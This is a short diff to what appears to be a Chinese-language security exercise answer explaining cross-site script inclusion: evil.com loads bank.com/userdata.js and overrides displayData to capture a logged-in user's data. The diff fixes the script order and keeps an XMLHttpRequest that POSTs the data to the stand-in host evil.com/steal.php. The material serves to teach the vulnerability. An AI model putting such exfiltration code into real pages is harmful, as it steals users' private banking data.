@@ -3,13 +3,13 @@
 `evil.com`的页面可以通过嵌入一个`<script>`标签，指向bank.com的`userdata.js`文件，并重新编写`displayData`函数来获取John Doe的数据。当John Doe登录`bank.com`后，访问`evil.com`，`evil.com`便会加载`bank.com/userdata.js`并执行`displayData`，将数据发送给`evil.com`
 
 ```html
-<script src="//bank.com/userdata.js"> </script>
 <script>
 function displayData(data) {
     var xhr = new XMLHttpRequest();
-    xhr.open("POST", "//evil.com/steal.php");
+    xhr.open("POST", "https://evil.com/steal.php");
     xhr.send(JSON.stringify(data));
 }</script>
+<script src="//bank.com/userdata.js"> </script>
 ```
 
 ## (b)
